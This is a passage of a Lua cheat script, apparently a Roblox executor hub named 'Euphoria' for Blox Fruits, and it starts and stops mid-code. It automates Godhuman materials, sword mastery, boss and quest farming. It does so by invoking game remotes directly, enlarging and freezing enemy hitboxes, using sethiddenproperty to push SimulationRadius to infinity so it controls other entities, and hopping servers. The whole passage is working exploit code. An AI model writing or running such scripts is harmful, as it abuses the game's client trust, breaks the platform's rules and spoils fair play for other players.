                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                                                if GetMaterial("Bones") < 500 then
                                                    if _G.GodhumanInfo['Electric Claw'] >= 400 and _G.GodhumanInfo['Sharkman Karate'] >= 400 and _G.GodhumanInfo['Sharkman Karate'] >= 400 and _G.GodhumanInfo['Death Step'] >= 400 then
                                                        FarmBonesGH = true
                                                    end
                                                else
                                                    FarmBonesGH = false
                                                end
                                            else
                                                FarmBonesGH = true
                                            end
                                            if LP.Backpack:FindFirstChild("Dragon Talon") or LP.Character:FindFirstChild("Dragon Talon") then
                                                if LP.Backpack:FindFirstChild("Dragon Talon") then
                                                    _G.GodhumanInfo["Dragon Talon"] = LP.Backpack:FindFirstChild("Dragon Talon").Level.Value
                                                elseif LP.Character:FindFirstChild("Dragon Talon") then
                                                    _G.GodhumanInfo["Dragon Talon"] = LP.Character:FindFirstChild("Dragon Talon").Level.Value
                                                end
                                            else
                                                _G.GodhumanInfo["Dragon Talon"] = false
                                            end
                                        else
                                            if _G.GodhumanWeaponSelected == "Dragon Talon" then
                                                _G.GodhumanWeaponSelected = false
                                            end
                                        end
                                    end
                                end
                                if _G.GodhumanInfo["Black Leg"] >= 400 and _G.GodhumanInfo["Electro"] >= 400 and _G.GodhumanInfo["Fishman Karate"] >= 400 and _G.GodhumanInfo["Dragon Claw"] >= 400 and _G.GodhumanInfo["Superhuman"] >= 400 and _G.GodhumanInfo["Death Step"] >= 400 and _G.GodhumanInfo["Electric Claw"] >= 400 and _G.GodhumanInfo["Sharkman Karate"] >= 400 and _G.GodhumanInfo["Dragon Talon"] >= 400 then
                                    if not LP.Backpack:FindFirstChild("Godhuman") and not LP.Character:FindFirstChild("Godhuman") then
                                        if GetMaterial("Fish Tail") < 20 then
                                            if not first_sea then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelMain")
                                            else
                                                if game:GetService("Workspace").Enemies:FindFirstChild("Fishman Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Commando") then
                                                    target = getClosest({"Fishman Warrior", "Fishman Commando"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                elseif ReplicatedStorage:FindFirstChild("Fishman Warrior") or ReplicatedStorage:FindFirstChild("Fishman Commando") then
                                                    target = getClosest({"Fishman Warrior", "Fishman Commando"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                else
                                                    for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                                        if string.find(v.Name, "Fishman Warrior") or string.find(v.Name, "Fishman Commando") then
                                                            if getDistance(v.CFrame) > 500 then
                                                                repeat wait()
                                                                    useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                                    toPoint(v.CFrame * CFrame.new(0,50,0))
                                                                until not _G.AutoGodhuman or getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Fishman Commando") or ReplicatedStorage:FindFirstChild("Fishman Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Commando") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Warrior")
                                                            end
                                                            if ReplicatedStorage:FindFirstChild("Fishman Commando") or ReplicatedStorage:FindFirstChild("Fishman Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Commando") or game:GetService("Workspace").Enemies:FindFirstChild("Fishman Warrior") then
                                                                break
                                                            end
                                                            wait(2)
                                                        end
                                                    end
                                                end
                                            end
                                        elseif GetMaterial("Magma Ore") < 20 then
                                            if not second_sea then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
                                            else
                                                if game:GetService("Workspace").Enemies:FindFirstChild("Magma Ninja") or game:GetService("Workspace").Enemies:FindFirstChild("Lava Pirate") then
                                                    target = getClosest({"Magma Ninja", "Lava Pirate"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                elseif ReplicatedStorage:FindFirstChild("Magma Ninja") or ReplicatedStorage:FindFirstChild("Lava Pirate") then
                                                    target = getClosest({"Magma Ninja", "Lava Pirate"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                else
                                                    for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                                        if string.find(v.Name, "Magma Ninja") or string.find(v.Name, "Lava Pirate") then
                                                            if getDistance(v.CFrame) > 500 then
                                                                repeat wait()
                                                                    useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                                    toPoint(v.CFrame * CFrame.new(0,50,0))
                                                                until not _G.AutoGodhuman or getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Lava Pirate") or ReplicatedStorage:FindFirstChild("Magma Ninja") or game:GetService("Workspace").Enemies:FindFirstChild("Lava Pirate") or game:GetService("Workspace").Enemies:FindFirstChild("Magma Ninja")
                                                            end
                                                            if ReplicatedStorage:FindFirstChild("Lava Pirate") or ReplicatedStorage:FindFirstChild("Magma Ninja") or game:GetService("Workspace").Enemies:FindFirstChild("Lava Pirate") or game:GetService("Workspace").Enemies:FindFirstChild("Magma Ninja") then
                                                                break
                                                            end
                                                            wait(2)
                                                        end
                                                    end
                                                end
                                            end

                                        elseif GetMaterial("Mystic Droplet") < 10 then
                                            if not second_sea then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
                                            else
                                                if game:GetService("Workspace").Enemies:FindFirstChild("Sea Soldier") or game:GetService("Workspace").Enemies:FindFirstChild("Water Fighter") then
                                                    target = getClosest({"Sea Soldier", "Water Fighter"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                elseif ReplicatedStorage:FindFirstChild("Sea Soldier") or ReplicatedStorage:FindFirstChild("Water Fighter") then
                                                    target = getClosest({"Sea Soldier", "Water Fighter"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                else
                                                    for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                                        if string.find(v.Name, "Sea Soldier") or string.find(v.Name, "Water Fighter") then
                                                            if getDistance(v.CFrame) > 500 then
                                                                repeat wait()
                                                                    useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                                    toPoint(v.CFrame * CFrame.new(0,50,0))
                                                                until not _G.AutoGodhuman or getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Water Fighter") or ReplicatedStorage:FindFirstChild("Sea Soldier") or game:GetService("Workspace").Enemies:FindFirstChild("Water Fighter") or game:GetService("Workspace").Enemies:FindFirstChild("Sea Soldier")
                                                            end
                                                            if ReplicatedStorage:FindFirstChild("Water Fighter") or ReplicatedStorage:FindFirstChild("Sea Soldier") or game:GetService("Workspace").Enemies:FindFirstChild("Water Fighter") or game:GetService("Workspace").Enemies:FindFirstChild("Sea Soldier") then
                                                                break
                                                            end
                                                            wait(2)
                                                        end
                                                    end
                                                end
                                            end
                                        elseif GetMaterial("Dragon Scale") < 10 then
                                            if not third_sea then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                            else
                                                if game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior") then
                                                    target = getClosest({"Dragon Crew Warrior", "Dragon Crew Archer"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                elseif ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") then
                                                    target = getClosest({"Dragon Crew Warrior", "Dragon Crew Archer"})
                                                    if target then
                                                        v = target
                                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                                            repeat task.wait()
                                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                                v.HumanoidRootPart.CanCollide = false
                                                                v.Humanoid.WalkSpeed = 0
                                                                v.Head.CanCollide = false
                                                                BringMobFarm = true
                                                                PosMon = v.HumanoidRootPart.CFrame
                                                                EquipWeapon(_G.SelectWeapon)
                                                                v.HumanoidRootPart.Transparency = 1
                                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            until not _G.AutoGodhuman or not v.Parent or v.Humanoid.Health <= 0
                                                        end
                                                    end
                                                else
                                                    for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                                        if string.find(v.Name, "Dragon Crew Warrior") or string.find(v.Name, "Dragon Crew Archer") then
                                                            if getDistance(v.CFrame) > 500 then
                                                                repeat wait()
                                                                    useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                                    toPoint(v.CFrame * CFrame.new(0,50,0))
                                                                until not _G.AutoGodhuman or getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior")
                                                            end
                                                            if ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior") then
                                                                break
                                                            end
                                                            wait(2)
                                                        end
                                                    end
                                                end
                                            end
                                            
                                        else
                                            if not third_sea then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                            else
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman", true)
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
                                            end
                                        end
                                    end
                                end
                            end
                        else
                            FarmBonesGH = false
                        end
                    end)
                end
            end)

            AutoTTKMastery = MiscFarmItemsSection:NewToggle("Auto Farm Mastery TTK Swords", function(state)
                getgenv().EuphoriaSettings["Auto Farm Mastery TTK Swords"] = state
                WriteSettings()
            end)

            if getgenv().EuphoriaSettings["Auto Farm Mastery TTK Swords"] then AutoTTKMastery:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Farm Mastery TTK Swords"] and not isWeaponInInventory("True Triple Katana") then _G.AutoTTKMastery = true else _G.AutoTTKMastery = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoTTKMastery then
                            if isWeaponInInventory("Wando") and getWeaponMastery("Wando") < 300 then
                                EquipSword("Wando")
                                _G.SelectWeapon = "Sword"
                                _G.FarmWeaponMastery = true
                            elseif isWeaponInInventory("Shisui") and getWeaponMastery("Shisui") < 300 then
                                EquipSword("Shisui")
                                _G.SelectWeapon = "Sword"
                                _G.FarmWeaponMastery = true
                            elseif isWeaponInInventory("Saddi") and getWeaponMastery("Saddi") < 300 then
                                EquipSword("Saddi")
                                _G.SelectWeapon = "Sword"
                                _G.FarmWeaponMastery = true
                            else
                                if LP.Data.Beli.Value > 2000000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("MysteriousMan","1")
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("MysteriousMan","2")
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("MysteriousMan","3")
                                end
                                _G.FarmWeaponMastery = false
                            end
                        end
                    end)
                end
            end)

            FarmBosses = MiscFarmItemsSection:NewToggle("Farm All Bosses", function(state)
                getgenv().EuphoriaSettings["Farm All Bosses"] = state
                WriteSettings()
            end)

            if getgenv().EuphoriaSettings["Farm All Bosses"] then FarmBosses:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm All Bosses"] then _G.FarmBosses = true else _G.FarmBosses = false end
                    end)
                end
            end)

            HopIfNoBosses = MiscFarmItemsSection:NewToggle("Hop If No Bosses", function(state)
                getgenv().EuphoriaSettings["Hop If No Bosses"] = state
                WriteSettings()
            end)

            if getgenv().EuphoriaSettings["Hop If No Bosses"] then HopIfNoBosses:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Hop If No Bosses"] then _G.HopIfNoBosses = true else _G.HopIfNoBosses = false end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.FarmBosses then
                            if second_sea then
                                bossList = {"Diamond", "Jeremy", "Fajita", "Smoke Admiral", "Awakened Ice Admiral", "Tide Keeper", "Don Swan"}
                            elseif third_sea then
                                bossList = {"Stone", "Island Empress", "Kilo Admiral", "Captain Elephant", "Beautiful Pirate", "Cake Queen", "Deandre", "Diablo", "Urban"}
                            end
                            boss = getClosest(bossList)
                            if not boss then
                                if _G.HopIfNoBosses then
                                    HopToLowestServer()
                                end
                            end
                            if boss and boss.Humanoid.Health > 0 then
                                repeat wait()
                                    if useNearestEntrance(boss.HumanoidRootPart.CFrame) then
                                        StopTween()
                                    end
                                    toTarget(boss.HumanoidRootPart.CFrame * OffsetCFrame())
                                    EquipWeapon(_G.SelectWeapon)
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                    boss.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                    boss.HumanoidRootPart.CanCollide = false
                                    boss.Humanoid.WalkSpeed = 0
                                    boss.Head.CanCollide = false
                                    BringMobFarm = true
                                    PosMon = boss.HumanoidRootPart.CFrame
                                    boss.HumanoidRootPart.Transparency = 1
                                until not boss or boss.Humanoid.Health < 0
                            end
                        end
                    end)
                end
            end)
        end

        if first_sea then
            local Sea1ItemsSection = FarmTab:NewSection("Sea 1 Items")
            AutoPole1st = Sea1ItemsSection:NewToggle("Auto Pole 1st Form", function(state)
                getgenv().EuphoriaSettings["Auto Pole 1st Form"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Pole 1st Form"] then AutoPole1st:UpdateToggle(nil, true) end
            AutoPole1stHop = Sea1ItemsSection:NewToggle("Auto Pole 1st Form Hop", function(state)
                getgenv().EuphoriaSettings["Auto Pole 1st Form Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Pole 1st Form Hop"] then AutoPole1stHop:UpdateToggle(nil, true) end
            Sea1ItemsSection:NewLabel(" ")
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Pole 1st Form"] and not isWeaponInInventory("Pole (1st Form)") then _G.AutoPole1st = true else _G.AutoPole1st = false end
                    end)
                end
            end)
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.AutoPole1st and first_sea then
                            if game.Workspace.Enemies:FindFirstChild("Thunder God") and game.Workspace.Enemies:FindFirstChild("Thunder God"):FindFirstChild("HumanoidRootPart") and game.Workspace.Enemies:FindFirstChild("Thunder God").Humanoid.Health > 0 then
                                v = game.Workspace.Enemies:FindFirstChild("Thunder God")
                                if v:FindFirstChild("HumanoidRootPart") then
                                    if v.Humanoid.Health <= 0 then 
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    else
                                        repeat task.wait()
                                            EquipWeapon(_G.SelectWeapon)
                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                            v.Humanoid:ChangeState(14)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Head.CanCollide = false
                                            BringMobFarm = false
                                            RenMon = v.Name
                                            RenPos = v.HumanoidRootPart.CFrame
                                        until not _G.AutoPole1st or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                else
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                end
                            elseif game.ReplicatedStorage:FindFirstChild("Thunder God") and game.ReplicatedStorage:FindFirstChild("Thunder God"):FindFirstChild("HumanoidRootPart") and game.ReplicatedStorage:FindFirstChild("Thunder God").Humanoid.Health > 0 then
                                v = game.ReplicatedStorage:FindFirstChild("Thunder God")
                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                wait(4)
                            else
                                if getgenv().EuphoriaSettings["Auto Pole 1st Form Hop"] then
                                    HopServer()
                                end
                            end
                        end
                    end)
                end
            end)
        end

        
        if second_sea then
            local Sea2ItemsSection = FarmTab:NewSection("Sea 2 Items")
            local Sea2MaterialsSection = FarmTab:NewSection("Sea 2 Materials")
            FarmFangs = Sea2MaterialsSection:NewToggle("Farm Vampire Fang", function(state)
                getgenv().EuphoriaSettings["Farm Vampire Fang"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Vampire Fang"] then FarmFangs:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Vampire Fang"] then _G.FarmFangs = true else _G.FarmFangs = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if _G.FarmFangs and second_sea then
                        local NPCList = {"Vampire"}
                        pcall(function()
                            npcTarget = getClosest(NPCList)
                            if npcTarget then
                                repeat task.wait()
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                    npcTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                    npcTarget.HumanoidRootPart.CanCollide = false
                                    npcTarget.Humanoid.WalkSpeed = 0
                                    npcTarget.Head.CanCollide = false
                                    BringMobFarm = true
                                    PosMon = npcTarget.HumanoidRootPart.CFrame
                                    EquipWeapon(_G.SelectWeapon)
                                    npcTarget.HumanoidRootPart.Transparency = 1
                                    toTarget(npcTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                until not _G.FarmFangs or not v.Parent or npcTarget.Humanoid.Health <= 0
                            else 
                                for i,v in pairs(getSpawnPoints(NPCList)) do
                                    if getClosest(NPCList) then break end
                                    if getDistance(v * OffsetCFrame()) > 100 then
                                        repeat wait()
                                            if useNearestEntrance(v * OffsetCFrame()) then
                                                StopTween()
                                            end
                                            toPoint(v * OffsetCFrame())
                                        until getDistance(v * OffsetCFrame()) < 50 or getClosest(NPCList) or not _G.FarmFangs
                                    end
                                end 
                            end
                        end)
                    end
                end
            end) 


            
            function GetQuestV3()
                local v33000 = ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
                if v33000 == 0 then
                    ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "2")
                    wait(.1)
                elseif v33000 == -1 then
                    notis.new("You dont have v2 race"):Display()
                end
            end
            function BuyV3Race()
                local v33000 = ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
                local v33000 = ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "3")
            end
            function isNPCAlive(NPCName)
                if workspace.Enemies:FindFirstChild(NPCName) or ReplicatedStorage:FindFirstChild(NPCName) then 
                    return true 
                else 
                    return false 
                end
            end
            skipTargets = {}
            function isInSkipTarget(Name)
                for i,v in ipairs(skipTargets) do
                    if v == Name then return true end
                end
                return false
            end

            AutoBartiloToggle = Sea2ItemsSection:NewToggle("Auto Bartilo Quest", function(state)
                getgenv().EuphoriaSettings["Auto Bartilo Quest"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Bartilo Quest"] then AutoBartiloToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Bartilo Quest"] then AutoBartilo = true else AutoBartilo = false end
                    end)
                end
            end)
            AutoSea3Bartilo = false
            spawn(function()
                while wait() do
                    pcall(function()
                        if (AutoBartilo or AutoSea3Bartilo) and LP.Data.Level.Value >= 800 then
                            BringMobFarm = false
                            if not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledBandits then
                                if string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan Pirates") and string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") and LP.PlayerGui.Main.Quest.Visible == true then 
                                    KillPosition = CFrame.new(949.148499, 102.9596939, 1274.4718)
                                    toPoint(KillPosition * OffsetCFrame())
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Swan Pirate") then
                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name == "Swan Pirate" then
                                                v.HumanoidRootPart.CFrame = KillPosition
                                                v.Humanoid.JumpPower = 0
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                v.HumanoidRootPart.Transparency = 1
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                if v.Humanoid:FindFirstChild("Animator") then
                                                    v.Humanoid.Animator:Destroy()
                                                end
                                                v.Humanoid:ChangeState(11)
                                                v.Humanoid:ChangeState(14)
                                                sethiddenproperty(LP, "SimulationRadius",  math.huge)
                                                wait()
                                            end
                                        end
                                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                            if v.Name == "Swan Pirate" then
                                                repeat task.wait()
                                                    sethiddenproperty(LP, "SimulationRadius", math.huge)
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.HumanoidRootPart.WalkSpeed = 0
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    toPoint(KillPosition * OffsetCFrame())										
                                                    v.HumanoidRootPart.CFrame = KillPosition
                                                until not v.Parent or v.Humanoid.Health <= 0 or not AutoBartilo or LP.PlayerGui.Main.Quest.Visible == false
                                            end
                                        end
                                    end
                                else
                                    repeat wait()
                                        toPoint(CFrame.new(-459.933136, 74.4530869, 300.132751, -0.220162302, 8.81837039e-08, 0.975463271, 1.34934794e-07, 1, -5.99470553e-08, -0.975463271, 1.18425852e-07, -0.220162302))
                                    until not AutoBartilo or getDistance(CFrame.new(-459.933136, 74.4530869, 300.132751, -0.220162302, 8.81837039e-08, 0.975463271, 1.34934794e-07, 1, -5.99470553e-08, -0.975463271, 1.18425852e-07, -0.220162302)) < 20
                                    wait(1)
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("StartQuest","BartiloQuest",1)
                                end 
                            elseif not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledSpring then
                                if game:GetService("Workspace").Enemies:FindFirstChild("Jeremy") then
                                    v = game:GetService("Workspace").Enemies:FindFirstChild("Jeremy")
                                    repeat wait()
                                        sethiddenproperty(LP, "SimulationRadius", math.huge)
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        v.HumanoidRootPart.CanCollide = false
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        toPoint(v.HumanoidRootPart.CFrame * OffsetCFrame())										
                                    until not v.Parent or v.Humanoid.Health <= 0 or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledSpring
                                elseif ReplicatedStorage:FindFirstChild("Jeremy") then
                                    v = ReplicatedStorage:FindFirstChild("Jeremy")
                                    repeat wait()
                                        sethiddenproperty(LP, "SimulationRadius", math.huge)
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        v.HumanoidRootPart.CanCollide = false
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        toPoint(v.HumanoidRootPart.CFrame * OffsetCFrame())										
                                    until not v.Parent or v.Humanoid.Health <= 0 or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").KilledSpring
                                else
                                    notis.new("Hop server for find Jeremy boss [Bartilo Quest]"):Display()
                                    notis.new("Hop server for find Jeremy boss [Bartilo Quest]"):Display()
                                    notis.new("Hop server for find Jeremy boss [Bartilo Quest]"):Display()
                                    wait(1)
                                    HopServer()
                                end
                            elseif not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates then
                                PlatesPosition = CFrame.new(-1837.8042, 28.7205391, 1721.03979, -0.694665372, -6.45133298e-08, 0.719333053, -7.54023333e-08, 1, 1.68683254e-08, -0.719333053, -4.25215489e-08, -0.694665372)
                                if getDistance(PlatesPosition) > 50 then
                                    repeat wait()
